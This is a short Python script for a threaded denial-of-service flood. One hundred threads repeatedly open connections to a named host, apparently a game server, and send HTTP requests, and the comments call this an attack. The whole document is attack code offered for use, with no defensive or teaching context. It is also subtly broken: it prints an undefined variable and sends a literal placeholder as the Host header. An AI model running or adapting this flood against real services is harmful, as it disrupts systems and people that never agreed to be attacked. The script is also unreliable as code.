import socket
import threading

# Define the target IP address and port
target_ip = 'inmine.su'  # Replace with your target IP
target_port = 19134  # Replace with your target port
angka = 0

# Function to perform the attack
def attack():
    while True:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the target
        s.connect((target_ip, target_port))
        # Send a simple HTTP GET request
        s.sendto(b"GET / HTTP/1.1\r\nHost: target_ip\r\n\r\n", (target_ip, target_port))
        # Close the socket
        s.close()

# Create multiple threads to simulate multiple attackers
for i in range(100):  # Number of threads
    thread = threading.Thread(target=attack)
    print ("attacking", target_ip, "no=", s)
    thread.start()